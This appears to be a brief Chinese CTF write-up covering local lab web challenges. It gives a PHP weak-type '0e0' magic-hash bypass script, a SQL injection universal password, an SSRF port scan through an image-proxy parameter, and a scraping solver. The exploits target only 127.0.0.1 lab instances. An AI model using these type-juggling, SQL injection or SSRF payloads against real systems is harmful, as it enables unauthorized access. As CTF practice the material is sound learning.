- > 没记的都是简单题
- > Re: 从零开始的 XDU 教书生活又是无聊的脚本题目，不写了
- # 静态网页
	- 从[这里](https://github.com/fghrsh/live2d_api)找到API定义，查看皮肤找到`final1l1l_challenge.php`
	- 然后绕弱类型
		- ```python
		  url = "http://127.0.0.1:40589/final1l1l_challenge.php"
		  
		  r = requests.post(url, params = {
		      "a": "0e0 "
		  }, data = {
		      "b[0e0 ]": "aa044f68228982a626273a592455c311"
		  })
		  print(r.text)
		  # print(r.json())
		  ```
- # 电院_Backend
	- sql注入，用万能密码`'||1||'`
- # 勇闯铜人阵
	- 脚本
		- ```python
		  url = "http://127.0.0.1:35927/"
		  
		  number_map = {
		      1: "北方",
		      2: "东北方",
		      3: "东方",
		      4: "东南方",
		      5: "南方",
		      6: "西南方",
		      7: "西方",
		      8: "西北方",
		  }
		  
		  base_request.reset_session()
		  r = base_post(url, data={"player": "114514", "direct": "弟子明白"})
		  for _ in range(5):
		      bs = BeautifulSoup(r.text)
		      question = bs.select("#status")[0].text.strip()
		  
		      if len(question) == 1:
		          answer = number_map[int(question)]
		      else:
		          print(question)
		          answer = "，".join(number_map[int(i)] + "一个" for i in question.split(", "))
		      print(answer)
		      r = base_post(url, data={"player": "114514", "direct": answer})
		  print(r.text)
		  ```
- # ImageCloud
	- 题目长得很吓人，实际上就只是一个SSRF而已
	- 先扫一下端口
		- ```python
		  url = "http://127.0.0.1:37361"
		  
		  def test_port(port):
		  
		      r = requests.get(url + "/image", params = {
		          "url": f"http://127.0.0.1:{port}/image/flag.jpg"
		      })
		  
		      return len(r.text)
		  ```
	- 然后对着对应的端口拿flag图片
		- ```python
		  r = base_get(url + "/image", params = {
		      "url": f"http://127.0.0.1:5423/image/flag.jpg"
		  })
		  
		  with open("flag.jpg", "wb") as f:
		      f.write(r.content)
		  ```
	- ![flag.jpg](../assets/flag_1723908165704_0.jpg){:height 476, :width 472}